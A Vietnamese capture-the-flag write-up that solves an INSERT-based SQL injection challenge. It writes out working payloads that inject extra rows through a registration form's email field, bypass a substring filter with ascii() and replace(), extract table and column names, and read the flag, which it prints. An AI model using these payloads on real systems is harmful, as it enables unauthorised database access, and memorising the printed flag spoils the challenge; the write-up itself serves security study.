# SQL injection - Insert

**Title**: Request Insert: fun & profit

**Point**: 40 Points

**Description**: Retrieve the flag.

## Solution:

Chúng ta có form "Authentication" dùng để xác thực và đăng nhập tài khoản:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161995498-915ec343-be38-4062-a467-2e437892b01a.png" /> </p>

Form "Register" dùng để đăng ký tài khoản với các trường thông tin như hình dưới:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161995684-8e5abfe4-470c-48ab-b60b-9e498e4fc249.png" /> </p>

Khi đăng nhập với user hợp lệ, ta sẽ có thông tin trả về:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161998779-27b5c92c-5680-4352-adab-a711cd0b4c14.png" /> </p>

Đây là một bài dạng Injection tại vị trí từ khóa **Insert**. Tạo tài khoản tương đương với việc thêm thông tin giá trị vào các trường trong CSDL. Bây giờ ta sẽ tìm vị trí có khả năng chèn payload vào, sau một hồi testing ta có được:
- Username và Password cấm nhập ký tự đặc biệt, chỉ cho nhập các ký tự [a-z], [A-Z] và [0-9] . Điều này khiến ta không thể **escape** được keyword **Insert**.
- Email. Filter: `substring` `insert`. Ngoài ra, không cấm ký tự nào. Đây là chỗ ta có thể "tiêm vào".
- Cơ sở dữ liệu là **MariabDB** (test theo bên dưới, dùng đủ kiểu cú pháp show ra version của một database)

Chúng ta nhớ rằng, **Insert** có thể thực hiện chèn nhiều dòng cùng một lúc với cú pháp như sau:

```
INSERT INTO table_name ( 'value1', 'value2' , 'value3'), ('value4', 'value5', 'value6'), ... ;
```

Vậy chúng ta có thể bypass và inject một đoạn giá trị chúng ta có thể kiểm soát và khi đăng nhập với valid user thì nó sẽ xuất ra thông tin cho ta biết

> Lưu ý: Dấu `;` không bị filter mất, tuy nhiên mình chưa nghĩ ra cách khai thác nào gọi là "out of the box" :)) đối với tình huống này (dấu `;` được "thả rông" thường mang lại tùy biến cao) , bởi vì kết quả chỉ hiện ra theo thông tin mình khai thác trên mệnh đề **Insert**. Nên mình cứ follow theo bài thôi :<

Đăng ký tài khoản. Bây giờ chúng ta thực hiện escape và thêm dữ liệu ta mong muốn vào:

> `Username` và `Password` điền bừa. Đảm bảo không bị trùng lặp khi insert vào database, nếu không sẽ có lỗi "Request failed" vì database không biết lấy dữ liệu bị lặp nào. "Request failed" có thể nguyên nhân khác là do bị sai cú pháp truy vấn

```
1') , ('hihi1', 'hihi2', (select Version()) ) ; -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162000641-eec3f4ec-de4a-4d7a-b530-bc5994c9fef1.png" /> </p>

Đăng nhập với `Username` là `haha1` và `Password` là `haha2` vừa đăng ký (insert vào) thành công:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162000928-d96b2858-3ac4-40e1-a190-589d295d3381.png" /> </p>

Tiếp theo ta tiếp tục exploit cơ bản. Lấy thông tin tên bảng:

```
1') , ('hihi3', 'hihi4', (select group_concat(table_name) from information_schema.tables) ) ; -- 
```
Đăng nhập với `hihi3` và `hihi4`

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162001733-dd326e95-59e3-4801-910e-ee1cac59190c.png" /> </p>

Giờ thì bắt đầu hơi "khoai" rồi đó. Để ý chuỗi được xuất ra bị giới hạn chiều dài, nhưng mà không "seo". Cái này mình có thể dùng `substring` để bypass, lấy mấy ký tự cuối thôi.

> Lưu ý 1: Thường các bảng được tạo trên MySQL hay MariabDB sẽ nằm ở cuối

> Lưu ý 2: Ta có thể dùng câu truy vấn như này `select info from information_schema.processlist` để biết được tên bảng ta đang thực hiện **Insert** là `membres`, lấy được cả các thông tin như trường `username`, `password`, `email`, `date` có trong bảng. Tuy nhiên, challenge này bắt ta phải tìm **flag**, không phải **password** của **admin**, hướng đi này sẽ dẫn đến ngõ cụt

Ây chà, quên mất. Chừng khoảng chừng 0.1s, `substring` đã bị filter. Giờ thì khổ rồi đây, ngoài `substring` thì không có hàm nào thực hiện công việc cắt chuỗi tương tự, hoặc mình không biết :v . Thử encode payload chỗ `substring` và để dưới dạng hex form thì bị lỗi trả về (cái này làm mình nhức nhối không biết bên back-end xử lý như thế nào). 

Thôi kệ nghĩ hướng khác . Sau một hồi search thì mình thấy có một hàm là `replace()`, nếu thinking một tí kết hợp với hàm `ascii()` thì đây là một combo khá "lực". Mình có thể đoán tên một cột theo nguyên lý sau.

Ví dụ:

ascii('username') = ascii('u') = 117. Ta biết ký tự đầu rồi, xóa nó đi với hàm `replace()`

ascii(replace('username', 'u', '')) = ascii('sername') = ascii('s') = 115. Ta biết ký tự số 2 rồi, xóa nó đi tiếp với hàm `replace`

ascii(replace('username', 'us', '')) = ascii('ername') = ascii('e') = 101. Ta biết ký tự số 3 rồi, xóa nó đi tiếp với hàm `replace`

...

Cứ thế cho đến khi ta tìm được hết ký tự cần tìm. Quá là lợi hại luôn ! Bây giờ vấn đề là bảng chúng ta cần tìm nằm ở hàng thứ mấy, cái này "eazy peasy" thôi, dự đoán tên bảng cần tìm nằm ở mấy hàng cuối trong `information_schema.tables`, cứ truy vấn ngược lên (thấy cái nào có liên quan thì lấy). Dùng hàm `count()` để lấy số dòng trả về:

```
1') , ('hihi5', 'hihi6', (select count(table_name) from information_schema.tables) ) ; -- 
```
Đăng nhập với `hihi5` và `hihi6`

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162006945-d33d1736-66bc-4d34-850d-4ee31ef22937.png" /> </p>

Giờ thì theo "combo" trên vận dụng 2 hàm `replace()` và `ascii()` và dùng hàm `char()` để chuyển ngược về ký tự để lấy tên bảng tại dòng thứ 80 có `offet=79`. Payload:

```
1') , ('hihi9', 'hihi10', (select char(ascii(table_name)) from information_schema.tables limit 79, 1)); -- 
```

Đăng nhập với `hihi9` và `hihi10`:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162008704-93a4896e-6fc0-4894-8912-2c66380644c9.png" /> </p>

OK. Chữ đầu là 'f' (Gặp mình bình thường mạnh dạn đoán table là "flag" luôn). Nhưng cứ làm tay cho chắc, payload xác định tại vị trí thứ 2 (xóa ký tự 'f' ở đầu để xác định ký tự tiếp theo):

```
1') , ('hihi11', 'hihi12', (select char(ascii(replace(table_name, 'f', ''))) from information_schema.tables limit 79, 1)); -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162009824-60163237-d46b-475c-af5d-c0201fc23e94.png" /> </p>

Chữ thứ 2 là 'l'. Xóa 'fl' đi, payload lấy ký tự thứ 3:

```
1') , ('hihi13', 'hihi14', (select char(ascii(replace(table_name, 'fl', ''))) from information_schema.tables limit 79, 1)); -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162010497-60fb77ac-a399-4f12-8e4f-2bebf95c62b5.png" /> </p>

Ký tự thứ 3 là 'a'. Xóa 'fla', tìm ký tự thứ 4:

```
1') , ('hihi15', 'hihi16', (select char(ascii(replace(table_name, 'fla', ''))) from information_schema.tables limit 79, 1)); -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162011390-2a9e5153-978d-478a-8ea8-dc49813dcbdb.png" /> </p>

Ký tự thứ 4 là 'g'. Xóa 'flag', tìm ký tự thứ 5:

```
1') , ('hihi17', 'hihi18', (select char(ascii(replace(table_name, 'flag', ''))) from information_schema.tables limit 79, 1)); -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162011064-86eb6624-d96a-40cb-bfa7-4813d3ba15cb.png" /> </p>

Không có gì xuất ra, vậy **table_name** cần tìm là 'flag'. Tìm tên các cột hiện có tương ứng trong bảng **flag**. Payload:

```
1') , ('hihi19', 'hihi20', (select group_concat(column_name) from information_schema.columns where table_name='flag')); -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162012187-a02615d0-0b29-4895-b43e-128b58ce3f11.png" /> </p>

Có đúng một trường flag. Giờ thì đọc nó ra và tận hưởng thôi <3. Final payload:

```
1') , ('hihi21', 'hihi22', (select flag from flag )); -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/162012725-743225a0-83bb-41cc-b2b5-f3c8fcbd57d6.png" /> </p>

Flag: **moaZ63rVXUhlQ8tVS7Hw**
